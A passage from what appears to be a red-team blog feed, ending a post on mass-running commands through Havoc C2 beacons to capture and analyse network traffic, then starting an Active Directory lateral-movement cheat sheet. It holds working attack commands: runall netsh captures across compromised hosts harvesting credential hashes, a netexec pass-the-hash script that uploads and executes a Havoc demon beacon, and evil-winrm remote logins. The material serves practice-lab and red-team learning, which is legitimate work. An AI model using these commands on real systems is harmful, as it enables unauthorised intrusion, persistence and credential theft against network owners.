+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">targets.txt - a text file containing a list of targets you want to compromise
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$LAPSUSER - the user with permission to access the LAPS password in LDAP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$SOURCE_BIN - the binary you wish to upload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$TARGET_BIN - the binary name on the receiving host &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;p>After deploying my beacons using &lt;code>nxc&lt;/code>, I was able to connect to them in Havoc and they started pinging back periodically as expected:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Multiple%20Beacons%20Deployed.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>I then started a trace on all the beacons at once using the following commands:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code># start the trace
+runall powershell netsh trace start capture=yes tracefile=C:\windows\temp\cap.etl
+# wait like 5-10 minutes for traffic to be generated
+runall powershell netsh trace stop
+# wait like 3-5 minutes until the trace is consolidated&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20netsh%20start%20trace.webp" title="Console from one of the agents receiving the command" alt="" loading="lazy" />
+&lt;figcaption>Console from one of the agents receiving the command&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>Data collection and consolidation takes some time but once it&amp;rsquo;s completed you should see a message as such:&lt;/p>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20netsh%20generate%20cab%20file.webp" title="Consolidation of data into CAB file" alt="" loading="lazy" />
+&lt;figcaption>Consolidation of data into CAB file&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>At this point we have an &lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-log" target="_blank" rel="noopener">ETL&lt;/a> file (Microsoft Event Trace Log File) which can be opened by ETW-centric tools like Microsoft Message Analyzer, but cannot be opened by Wireshark and co. Ideally, we want a file format that is supported by most tools which analyse network data, aka we want a &lt;a href="https://www.netresec.com/?page=Blog&amp;amp;month=2022-10&amp;amp;post=What-is-a-PCAP-file" target="_blank" rel="noopener">PCAP&lt;/a> or &lt;a href="https://pcapng.com/" target="_blank" rel="noopener">PCAPng&lt;/a> file. As such we can convert the &lt;code>.etl&lt;/code> file into a &lt;code>.pcapng&lt;/code> file using the &lt;a href="https://github.com/microsoft/etl2pcapng" target="_blank" rel="noopener">etl2pcapng&lt;/a> utility tool.&lt;/p>
+&lt;p>I couldn&amp;rsquo;t be bothered to download all the &lt;code>.etl&lt;/code> files to a local Windows VM so I&amp;rsquo;m using &lt;a href="https://github.com/fortra/No-Consolation" target="_blank" rel="noopener">noconsolation&lt;/a> (A BOF that runs unmanaged PEs inline) to execute &lt;code>etl2pcapng&lt;/code> and convert all trace log files to &lt;code>.pcapng&lt;/code>:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code># running etl2pcapng to convert etl to pcapng directly on the hosts
+# --no-output needed on certain OSes like Windows 2016 Server
+runall yesconsolation --no-output /home/lo/tools/etl2pcapng.exe C:\windows\temp\cap.etl C:\windows\temp\cap.pcapng&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20yesconsolation%20etl2pcapng.webp" title="Converting .etl to .pcapng directly on the hosts" alt="" loading="lazy" />
+&lt;figcaption>Converting .etl to .pcapng directly on the hosts&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>&lt;/svg>Warning&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>There is an issue with some of the automatically imported Havoc BOFs (commands) which cause the client to crash under certain conditions. For example running &lt;code>runall noconsolation&lt;/code> will crash the client. To fix it you need to import the BOFs yourself, which is what I&amp;rsquo;ve done here with the &lt;code>yesconsolation&lt;/code> command (&lt;code>noconsolation&lt;/code> -&amp;gt; &lt;code>yesconsolation&lt;/code>). &lt;br>
+&lt;em>This is not something I have control over, however from the code updates I&amp;rsquo;ve seen, it should be fixed in the Havoc re-write version.&lt;/em>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Downloading &amp;amp; Merging the data&lt;span class="hx-absolute -hx-mt-20" id="downloading--merging-the-data">&lt;/span>
+&lt;a href="#downloading--merging-the-data" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>At this point we have a &lt;code>.pcapng&lt;/code> file for each host which we need to download and merge so we can analyse the data offline. To do this we can use the built-in Havoc download command to retrieve the &lt;code>.pcapng&lt;/code> files:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code>runall download C:\windows\temp\mycoolnetwork.pcapng&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>Depending on how large the PCAP is, this may take a while&amp;hellip; You can use the last seen tab to know when the file has finished downloading vs when it&amp;rsquo;s still downloading:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Downloading%20PCAP%20files.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>Once downloaded, you can navigate to your local Havoc install and find the &lt;code>data/loot&lt;/code> folder which is where the downloaded files will be located:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Downloaded%20all%20pcapng%20files%20locally.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>Now we don&amp;rsquo;t want to deal with each packet capture one at a time, so instead we can merge them into a single large PCAP file using the &lt;a href="https://www.wireshark.org/docs/man-pages/mergecap.html" target="_blank" rel="noopener">mergecap&lt;/a> tool (which is part of Wireshark):&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20mergecap.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>Some tools might not work with pcapng (eg. the free version of &lt;a href="https://www.netresec.com/?page=NetworkMiner" target="_blank" rel="noopener">NetworkMiner&lt;/a>) and require the old school pcap format instead, which we can easily create using &lt;a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="noopener">tshark&lt;/a> (part of Wireshark as well):&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20tshark%20combine.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>&lt;em>The old school PCAP format does not have all the bells and whistles of the PCAPng format and therefore may loose some data during conversion. This explains the discrepancy in the file sizes above.&lt;/em>&lt;/p>
+&lt;h3>Analysing the data&lt;span class="hx-absolute -hx-mt-20" id="analysing-the-data">&lt;/span>
+&lt;a href="#analysing-the-data" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Note&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>We didn&amp;rsquo;t filter the data before combining it, which means 2 systems talking to each other will have generated the same packets (in opposite direction) which would have been captured during data gathering. Hence, if we captured the data correctly, we can assume that we have at least double the amount of packets needed (disregarding packet loss). I&amp;rsquo;ll leave the packet filtering as an exercise for the reader. &lt;br>
+Alternatively, we could use the extra packet to compare both hosts to ensure no packet manipulation is being performed between the hosts and perform additional data analysis.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;p>Ignoring the duplicate packets, we can load this fat PCAP into &lt;a href="https://www.netresec.com/?page=NetworkMiner" target="_blank" rel="noopener">NetworkMiner&lt;/a> to get a quick overview of the environment. You can run NetworkMiner from Linux using &lt;a href="https://www.mono-project.com/" target="_blank" rel="noopener">mono&lt;/a> (the Cross platform, open source .NET framework):&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code>mono NetworkMiner.exe --noupdatecheck&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>Because its a big file and we&amp;rsquo;re running NetworkMiner via mono on Linux, this takes a while to process&amp;hellip; Probably worth taking a coffee break here. Alternatively, you can probably parse this much faster on windows. But I&amp;rsquo;m lazy so imma go with the coffee break route instead&amp;hellip;&lt;/p>
+&lt;p>&lt;em>&lt;strong>edit:&lt;/strong> I&amp;rsquo;ve been here a while&amp;hellip; this is taking a looong time.&lt;/em>&lt;/p>
+&lt;p>After it finally finishes parsing, we get an idea about what we managed to capture, namely:&lt;/p>
+&lt;ul>
+&lt;li>44 hosts&lt;/li>
+&lt;li>1389 DNS queries&lt;/li>
+&lt;li>61 Credentials (these are mostly hashes)&lt;/li>
+&lt;li>A lot of files (?!)&lt;/li>
+&lt;li>A single host on the 10.10.14.0/24 network, namely my host since I performed the capture when no-one else was using the environment&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20NetworkMiner%20Loot.webp" title="NetworkMiner Hosts Tab" alt="" loading="lazy" />
+&lt;figcaption>NetworkMiner Hosts Tab&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20NetworkMiner%20Credentials%20Tab.webp" title="NetworkMiner Credentials Tab" alt="" loading="lazy" />
+&lt;figcaption>NetworkMiner Credentials Tab&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>We can use tshark to generate a table like output of IP Communications and see which hosts are communicating together:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Tshark%20IP%20Communication.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>I tried playing around with python tools but because the PCAP is of decent size, it was quite slow so I resorted to writing a good ol&amp;rsquo; C program to parse the PCAP using &lt;a href="https://www.tcpdump.org/" target="_blank" rel="noopener">libpcap&lt;/a> which generates a DOT file that can be converted to a graph using &lt;a href="https://graphviz.org/" target="_blank" rel="noopener">GraphViz&lt;/a>:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Visualising%20IP%20Network%20map.webp" alt="" loading="lazy" />&lt;/p>
+&lt;p>The graph above already highlights a few things about the environment:&lt;/p>
+&lt;ul>
+&lt;li>RED: my Kali VM;&lt;/li>
+&lt;li>GREEN: the two entrypoints I&amp;rsquo;m using to gain access to the internal network (ie. jumpboxes);&lt;/li>
+&lt;li>BLUE: the node which connects to nearly every other node in the domain aka the domain controller.&lt;/li>
+&lt;/ul>
+&lt;p>We can also see the domain controller is talking to other nodes that I might not have compromised or have no beacon on, namely the IPs &lt;code>10.10.120.20&lt;/code> and &lt;code>10.10.122.20&lt;/code>. There&amp;rsquo;s a good reason these don&amp;rsquo;t appear to be connected to any other node on the network but I&amp;rsquo;ll this as an exercise for the reader.&lt;/p>
+&lt;p>We can also see the two Google DNS IPs (&lt;code>8.8.8.8&lt;/code> and &lt;code>8.8.4.4&lt;/code>) being connected to the Blue node which indicate that the domain controller is likely using Google DNS server for external DNS queries. It also connects to multiple root name servers, namely e.root-servers.net (&lt;code>192.203.230.10&lt;/code>) and g.root-servers.net (&lt;code>192.112.36.4&lt;/code>).&lt;/p>
+&lt;p>As such, we have a decent overview of the network. We can also start performing additional data analysis to for example find open ports and services on the network like HTTPS (port 443), RDP (port 3389) and Microsoft SQL Server (port 1433):&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Analysis%20Open%20Ports.webp" alt="" loading="lazy" />&lt;/p>
+&lt;h2>Conclusion and use cases&lt;span class="hx-absolute -hx-mt-20" id="conclusion-and-use-cases">&lt;/span>
+&lt;a href="#conclusion-and-use-cases" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h2>&lt;p>The Havoc Run All Module is a fun tool to play around with in test environments but since it generates a lot of IOCs, it wouldn&amp;rsquo;t be too practical in Red Team engagements unless you&amp;rsquo;re looking to go all out and validate that the Blue Team can catch you.&lt;/p>
+&lt;p>I do see some potential within practice environments like HTB Pro Labs, OffSec OSEP, etc. It&amp;rsquo;s overall really fun to use and does feel pretty powerful when you don&amp;rsquo;t have to worry about OPSEC! Combine it with a BOF that searches for flags or does post-exploitation looting and you&amp;rsquo;ve got yourself a powerful weapon for those pesky practice environments which hide loot everywhere.&lt;/p>
+&lt;p>Passive Network Monitoring and analysis has a lot of potential for attackers willing to expand their knowledge of the network without having to actively probe ports and hosts. Definitely something I will investigate further in the future&amp;hellip;&lt;/p>
+&lt;p>The Havoc Run All Module can be found here: &lt;a href="https://github.com/fyxme/havoc-runall-poc" target="_blank" rel="noopener">https://github.com/fyxme/havoc-runall-poc&lt;/a>&lt;/p>
+&lt;h2>Future Research&lt;span class="hx-absolute -hx-mt-20" id="future-research">&lt;/span>
+&lt;a href="#future-research" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>Explore packet analysis further. Develop additional analysis tools to filter, search and visualise PCAP data.
+&lt;ul>
+&lt;li>SYN-ACK responses indicates open ports but may miss ports if the packet capture was started after the connection occurred&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Turn the packet analysis C tools into a BOF that can also capture network packets and passively identify open ports without having to export large Packet Capture files over C2 comms&lt;/li>
+&lt;li>Look into trying out &lt;a href="https://github.com/nsacyber/GRASSMARLIN" target="_blank" rel="noopener">GRASSMARLIN&lt;/a> which is targeted towards Industrial Control Systems (ICS), however could still be useful to map out an environment from a PCAP&lt;/li>
+&lt;/ul></description></item><item><title/><link>https://fyx.me/bazaar/windows/active-directory/lateral-movement/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/active-directory/lateral-movement/</guid><description>
+&lt;h3>&lt;code>netexec&lt;/code>&lt;span class="hx-absolute -hx-mt-20" id="netexec">&lt;/span>
+&lt;a href="#netexec" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>Upload and execute file on target(s):&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#TARGET=&amp;#34;topwn.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#TARGET=&amp;#34;computers.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TARGET&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;mx01.target.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#TARGET=&amp;#34;srv.target.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">USER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;asdf_da&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#USER=&amp;#34;users.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#PASSHASH=&amp;#34;-p myshittypass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#PASSHASH=&amp;#34;-H \&amp;#34;44444444444444444444444444444444\&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PASSHASH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;-H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SOURCE_BIN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/home/kali/webserver/demon.x64.exe&amp;#34;&lt;/span> &lt;span class="c1"># full path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TARGET_BIN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cmon.exe&amp;#34;&lt;/span> &lt;span class="c1"># just the bin name and ext&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">EXEC_METHOD&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;--exec-method atexec&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#EXEC_METHOD=&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">EXTRA&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#EXTRA=&amp;#34;--laps&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#EXTRA=&amp;#34;--laps MyLocalAdministrator&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec smb &lt;span class="nv">$TARGET&lt;/span> -u &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$USER&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$PASSHASH&lt;/span> --put-file &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SOURCE_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;\\Windows\\Temp\\&lt;/span>&lt;span class="nv">$TARGET_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -x &lt;span class="s2">&amp;#34;C:\\Windows\\Temp\\&lt;/span>&lt;span class="nv">$TARGET_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$EXEC_METHOD&lt;/span> &lt;span class="nv">$EXTRA&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>WinRm : &lt;code>Enter-PSSession&lt;/code> / &lt;code>evil-winrm&lt;/code>&lt;span class="hx-absolute -hx-mt-20" id="winrm--enter-pssession--evil-winrm">&lt;/span>
+&lt;a href="#winrm--enter-pssession--evil-winrm" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-rounded-lg hx-border hx-py-2 ltr:hx-pr-4 rtl:hx-pl-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-orange-100 hx-bg-orange-50 hx-text-orange-800 dark:hx-border-orange-400/30 dark:hx-bg-orange-400/20 dark:hx-text-orange-300">
+&lt;div class="ltr:hx-pl-3 ltr:hx-pr-2 rtl:hx-pr-3 rtl:hx-pl-2">&lt;/div>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;strong>ports:&lt;/strong>
+5985 (HTTP) and 5986 (HTTPS) (Below Windows 7: 80 and 443)&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># finding open ports&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -p5985,5986 -iL computers.txt -Pn -v&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Connect from Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">evil-winrm -i Server01 -u USER -p PASS&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
